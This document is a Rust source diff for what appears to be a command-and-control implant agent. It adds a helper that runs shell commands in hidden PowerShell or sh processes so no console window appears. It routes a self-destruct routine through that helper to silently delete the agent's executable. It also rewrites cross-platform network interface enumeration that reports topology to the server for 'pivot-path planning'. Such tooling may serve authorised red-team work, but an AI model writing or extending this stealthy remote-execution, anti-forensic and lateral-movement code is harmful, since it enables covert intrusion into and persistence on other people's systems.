@@ -2,6 +2,37 @@
 use uuid::Uuid;
 use sha2::{Sha256, Digest};
 use std::process::Command;
+
+// ── Shell spawn helper — keeps Windows-only API entirely off Linux/macOS ────
+
+/// Spawn a shell command as a child process.
+/// On Windows: PowerShell with CREATE_NO_WINDOW so no console flashes up.
+/// On everything else: sh -c.
+#[cfg(target_os = "windows")]
+fn spawn_shell(cmd: &str) -> std::io::Result<std::process::Child> {
+    use std::os::windows::process::CommandExt;
+    // CREATE_NO_WINDOW: tells Windows not to allocate a console window for this
+    // child process. This is the correct and sufficient flag — do NOT add
+    // DETACHED_PROCESS, which severs stdout/stderr pipe inheritance and causes
+    // the child to produce no output even when Stdio::piped() is set.
+    const CREATE_NO_WINDOW: u32 = 0x0800_0000;
+    Command::new("powershell")
+        .args(["-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden", "-Command", cmd])
+        .stdout(std::process::Stdio::piped())
+        .stderr(std::process::Stdio::piped())
+        .creation_flags(CREATE_NO_WINDOW)
+        .spawn()
+}
+
+#[cfg(not(target_os = "windows"))]
+fn spawn_shell(cmd: &str) -> std::io::Result<std::process::Child> {
+    Command::new("sh")
+        .args(["-c", cmd])
+        .stdout(std::process::Stdio::piped())
+        .stderr(std::process::Stdio::piped())
+        .spawn()
+}
+
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
 use crate::transport::C2Stream;
 
@@ -84,26 +115,9 @@ pub fn execute_shell_command(cmd: &str) -> (String, String, i32) {
 /// long-running processes from permanently consuming a Tokio blocking thread
 /// — doing this 512 times exhausts the blocking pool and freezes the agent.
 pub fn execute_shell_command_timeout(cmd: &str, timeout: std::time::Duration) -> (String, String, i32) {
-    let mut child = if cfg!(target_os = "windows") {
-        match Command::new("powershell")
-            .args(["-NoProfile", "-Command", cmd])
-            .stdout(std::process::Stdio::piped())
-            .stderr(std::process::Stdio::piped())
-            .spawn()
-        {
-            Ok(c) => c,
-            Err(e) => return (String::new(), e.to_string(), -1),
-        }
-    } else {
-        match Command::new("sh")
-            .args(["-c", cmd])
-            .stdout(std::process::Stdio::piped())
-            .stderr(std::process::Stdio::piped())
-            .spawn()
-        {
-            Ok(c) => c,
-            Err(e) => return (String::new(), e.to_string(), -1),
-        }
+    let mut child = match spawn_shell(cmd) {
+        Ok(c) => c,
+        Err(e) => return (String::new(), e.to_string(), -1),
     };
 
     // Take ownership of pipes BEFORE the wait loop and drain them on
@@ -471,9 +485,7 @@ pub fn self_destruct() -> ! {
         let path = current_exe.to_string_lossy().replace('\'', "''");
         let cmd = format!("Start-Sleep -Seconds 3; Remove-Item -Path '{}' -Force", path);
         
-        let _ = std::process::Command::new("powershell")
-            .args(["-NoProfile", "-WindowStyle", "Hidden", "-Command", &cmd])
-            .spawn();
+        let _ = spawn_shell(&cmd);
     }
 
     #[cfg(not(target_os = "windows"))]
@@ -530,126 +542,172 @@ pub fn strip_ansi(s: &str) -> String {
     result
 }
 
-
 // ── Network interface enumeration ─────────────────────────────────────────────
-// Used by ClientHello to report agent interface data for topology inference.
-// No network probes are sent — this is a local kernel query only.
+//
+// Used by the agent to report its local network topology to the server at
+// registration time.  The server scores these for pivot-path planning.
+//
+// Implementation:
+//   Unix  — parses `ip -o addr show` (Linux) / `ifconfig -a` (macOS) output.
+//            Both produce one address per line in a consistent format.
+//   Windows — PowerShell Get-NetIPAddress | ConvertTo-Json.
+//   Other   — returns empty list; topology simply won't rank that agent.
 
-use crate::common::NetworkInterface;
-
-/// Enumerate host network interfaces and return them in CIDR notation.
-/// Linux: uses libc::getifaddrs (already in Cargo dependencies).
-/// Other platforms: returns an empty vec (add GetAdaptersAddresses for Windows).
-pub fn get_network_interfaces() -> Vec<NetworkInterface> {
-    #[cfg(target_os = "linux")]
-    {
-        get_interfaces_linux()
-    }
-    #[cfg(not(target_os = "linux"))]
-    {
-        vec![]
-    }
+pub fn get_network_interfaces() -> Vec<crate::common::NetworkInterface> {
+    #[cfg(target_os = "linux")]   { get_ifaces_linux() }
+    #[cfg(target_os = "macos")]   { get_ifaces_macos() }
+    #[cfg(target_os = "windows")] { get_ifaces_windows() }
+    #[cfg(not(any(
+        target_os = "linux",
+        target_os = "macos",
+        target_os = "windows"
+    )))] { vec![] }
 }
+
+// ── Linux: ip -o addr show ───────────────────────────────────────────────────
 
 #[cfg(target_os = "linux")]
-fn get_interfaces_linux() -> Vec<NetworkInterface> {
+fn get_ifaces_linux() -> Vec<crate::common::NetworkInterface> {
     use std::collections::HashMap;
-    use std::ffi::CStr;
-    use std::net::{Ipv4Addr, Ipv6Addr};
 
-    let mut map: HashMap<String, NetworkInterface> = HashMap::new();
+    // `ip -o addr show` prints one address per line:
+    //   2: eth0    inet 192.168.1.5/24 brd 192.168.1.255 scope global eth0
+    //   2: eth0    inet6 fe80::1/64 scope link
+    let (out, _, _) = execute_shell_command("ip -o addr show 2>/dev/null");
 
-    unsafe {
-        let mut ifap: *mut libc::ifaddrs = std::ptr::null_mut();
-        if libc::getifaddrs(&mut ifap) != 0 {
-            return vec![];
+    // Collect addresses per interface name, then read flags from sysfs
+    let mut map: HashMap<String, Vec<String>> = HashMap::new();
+    for line in out.lines() {
+        let cols: Vec<&str> = line.split_whitespace().collect();
+        // cols[1] = name, cols[2] = inet/inet6, cols[3] = addr/prefix
+        if cols.len() >= 4 && (cols[2] == "inet" || cols[2] == "inet6") {
+            let name = cols[1].trim_end_matches(':').to_string();
+            map.entry(name).or_default().push(cols[3].to_string());
         }
-
-        let mut ifa = ifap;
-        while !ifa.is_null() {
-            let iface = &*ifa;
-            let name = CStr::from_ptr(iface.ifa_name)
-                .to_string_lossy()
-                .into_owned();
-
-            let entry = map.entry(name.clone()).or_insert_with(|| {
-                let f = iface.ifa_flags;
-                let mut flags = Vec::new();
-                if f & libc::IFF_UP as u32 != 0     { flags.push("UP".to_string()); }
-                if f & libc::IFF_LOOPBACK as u32 != 0 { flags.push("LOOPBACK".to_string()); }
-                if f & libc::IFF_RUNNING as u32 != 0  { flags.push("RUNNING".to_string()); }
-                NetworkInterface { name: name.clone(), addresses: vec![], flags }
-            });
-
-            if !iface.ifa_addr.is_null() {
-                let family = (*(iface.ifa_addr as *const libc::sockaddr)).sa_family as i32;
-
-                if family == libc::AF_INET {
-                    let sin = &*(iface.ifa_addr as *const libc::sockaddr_in);
-                    let ip = Ipv4Addr::from(u32::from_be(sin.sin_addr.s_addr));
-                    let prefix = if !iface.ifa_netmask.is_null() {
-                        let m = &*(iface.ifa_netmask as *const libc::sockaddr_in);
-                        u32::from_be(m.sin_addr.s_addr).count_ones() as u8
-                    } else { 32 };
-                    entry.addresses.push(format!("{}/{}", ip, prefix));
-
-                } else if family == libc::AF_INET6 {
-                    let sin6 = &*(iface.ifa_addr as *const libc::sockaddr_in6);
-                    let ip = Ipv6Addr::from(sin6.sin6_addr.s6_addr);
-                    let prefix = if !iface.ifa_netmask.is_null() {
-                        let m = &*(iface.ifa_netmask as *const libc::sockaddr_in6);
-                        m.sin6_addr.s6_addr.iter().map(|b| b.count_ones()).sum::<u32>() as u8
-                    } else { 128 };
-                    entry.addresses.push(format!("{}/{}", ip, prefix));
-                }
-            }
-
-            ifa = iface.ifa_next;
-        }
-
-        libc::freeifaddrs(ifap);
     }
 
-    map.into_values().collect()
+    map.into_iter().map(|(name, addresses)| {
+        let flags = read_linux_flags(&name);
+        crate::common::NetworkInterface { name, addresses, flags }
+    }).collect()
 }
 
-#[cfg(test)]
-mod interface_tests {
-    use super::*;
+/// Read IFF_* flag names from /sys/class/net/<name>/flags (hex bitmask).
+#[cfg(target_os = "linux")]
+fn read_linux_flags(name: &str) -> Vec<String> {
+    let path = format!("/sys/class/net/{}/flags", name);
+    let raw  = std::fs::read_to_string(&path).unwrap_or_default();
+    let hex  = raw.trim().trim_start_matches("0x");
+    let bits = u32::from_str_radix(hex, 16).unwrap_or(0);
 
-    #[test]
-    fn get_network_interfaces_does_not_panic() {
-        let _ = get_network_interfaces();
-    }
+    // Standard Linux IFF_* bits (from <net/if.h>)
+    const FLAGS: &[(u32, &str)] = &[
+        (0x0001, "UP"),
+        (0x0002, "BROADCAST"),
+        (0x0008, "LOOPBACK"),
+        (0x0010, "POINTTOPOINT"),
+        (0x0040, "RUNNING"),
+        (0x0100, "PROMISC"),
+        (0x1000, "MULTICAST"),
+    ];
+    FLAGS.iter().filter(|(bit, _)| bits & bit != 0).map(|(_, n)| n.to_string()).collect()
+}
 
-    #[cfg(target_os = "linux")]
-    #[test]
-    fn linux_has_at_least_loopback() {
-        let ifaces = get_network_interfaces();
-        assert!(!ifaces.is_empty(), "Linux should always have at least 'lo'");
-    }
+// ── macOS: ifconfig -a ───────────────────────────────────────────────────────
 
-    #[cfg(target_os = "linux")]
-    #[test]
-    fn loopback_has_loopback_flag() {
-        let ifaces = get_network_interfaces();
-        if let Some(lo) = ifaces.iter().find(|i| i.name == "lo") {
-            assert!(
-                lo.flags.iter().any(|f| f == "LOOPBACK"),
-                "'lo' missing LOOPBACK flag; got {:?}", lo.flags
-            );
+#[cfg(target_os = "macos")]
+fn get_ifaces_macos() -> Vec<crate::common::NetworkInterface> {
+    use std::collections::HashMap;
+
+    // ifconfig -a output:
+    //   en0: flags=8863<UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST> mtu 1500
+    //       inet 192.168.1.5 netmask 0xffffff00 broadcast 192.168.1.255
+    //       inet6 fe80::1%en0 prefixlen 64 scopeid 0x4
+    let (out, _, _) = execute_shell_command("ifconfig -a 2>/dev/null");
+
+    let mut map: HashMap<String, (Vec<String>, Vec<String>)> = HashMap::new();
+    let mut current = String::new();
+
+    for line in out.lines() {
+        if !line.starts_with('\t') && !line.starts_with(' ') {
+            // Interface header: "en0: flags=…"
+            if let Some(colon) = line.find(':') {
+                current = line[..colon].to_string();
+                // Parse flag names from <…>
+                let flags = parse_macos_flags(line);
+                map.entry(current.clone()).or_default().1 = flags;
+            }
+        } else if !current.is_empty() {
+            let trimmed = line.trim();
+            if trimmed.starts_with("inet6 ") {
+                let parts: Vec<&str> = trimmed.split_whitespace().collect();
+                if parts.len() >= 4 {
+                    let addr  = parts[1].split('%').next().unwrap_or(parts[1]);
+                    let pfx   = parts[3];
+                    map.entry(current.clone()).or_default().0
+                       .push(format!("{}/{}", addr, pfx));
+                }
+            } else if trimmed.starts_with("inet ") {
+                let parts: Vec<&str> = trimmed.split_whitespace().collect();
+                if parts.len() >= 4 {
+                    let addr = parts[1];
+                    // netmask is hex: 0xffffff00 → 24 bits
+                    let hex  = parts[3].trim_start_matches("0x");
+                    let mask = u32::from_str_radix(hex, 16).unwrap_or(0);
+                    let pfx  = mask.count_ones();
+                    map.entry(current.clone()).or_default().0
+                       .push(format!("{}/{}", addr, pfx));
+                }
+            }
         }
     }
 
-    #[cfg(target_os = "linux")]
-    #[test]
-    fn loopback_address_starts_with_127() {
-        let ifaces = get_network_interfaces();
-        if let Some(lo) = ifaces.iter().find(|i| i.name == "lo") {
-            assert!(
-                lo.addresses.iter().any(|a| a.starts_with("127.")),
-                "'lo' missing 127.x address; got {:?}", lo.addresses
-            );
+    map.into_iter().map(|(name, (addresses, flags))| {
+        crate::common::NetworkInterface { name, addresses, flags }
+    }).collect()
+}
+
+#[cfg(target_os = "macos")]
+fn parse_macos_flags(header: &str) -> Vec<String> {
+    // Extract the angle-bracketed list:  flags=8863<UP,BROADCAST,RUNNING,…>
+    if let (Some(a), Some(b)) = (header.find('<'), header.find('>')) {
+        return header[a+1..b].split(',').map(|s| s.to_string()).collect();
+    }
+    vec![]
+}
+
+// ── Windows: Get-NetIPAddress ────────────────────────────────────────────────
+
+#[cfg(target_os = "windows")]
+fn get_ifaces_windows() -> Vec<crate::common::NetworkInterface> {
+    use std::collections::HashMap;
+
+    // PowerShell returns a JSON array of address objects
+    let ps = "Get-NetIPAddress | Select-Object InterfaceAlias,IPAddress,PrefixLength | ConvertTo-Json -Compress";
+    let (out, _, _) = execute_shell_command(ps);
+
+    let mut map: HashMap<String, Vec<String>> = HashMap::new();
+    if let Ok(val) = serde_json::from_str::<serde_json::Value>(out.trim()) {
+        let arr = match &val {
+            serde_json::Value::Array(a) => a.as_slice().to_vec(),
+            obj => vec![obj.clone()],  // single object (only one address)
+        };
+        for item in arr {
+            let name   = item["InterfaceAlias"].as_str().unwrap_or("unknown").to_string();
+            let addr   = item["IPAddress"].as_str().unwrap_or("").to_string();
+            let prefix = item["PrefixLength"].as_u64().unwrap_or(24);
+            if !addr.is_empty() {
+                map.entry(name).or_default().push(format!("{}/{}", addr, prefix));
+            }
         }
     }
+
+    map.into_iter().map(|(name, addresses)| {
+        // Report UP+RUNNING for all Windows adapters (no easy bitmask without WinAPI)
+        crate::common::NetworkInterface {
+            name,
+            addresses,
+            flags: vec!["UP".to_string(), "RUNNING".to_string()],
+        }
+    }).collect()
 }
